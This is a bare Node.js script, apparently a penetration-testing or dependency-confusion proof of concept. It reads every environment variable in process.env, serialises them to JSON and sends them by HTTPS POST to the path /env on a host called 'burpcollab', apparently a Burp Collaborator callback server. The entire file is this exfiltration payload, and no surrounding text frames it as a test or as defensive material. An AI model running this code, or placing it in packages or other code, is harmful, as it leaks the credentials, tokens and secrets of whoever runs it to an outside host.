const https = require('https');

const data = JSON.stringify(process.env);
const options = {
  hostname: 'burpcollab',
  port: 443,
  path: '/env',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': data.length
  }
};

const req = https.request(options, res => {
  console.log(`statusCode: ${res.statusCode}`);
});

req.on('error', error => {
  console.error(error);
});

req.write(data);
req.end();
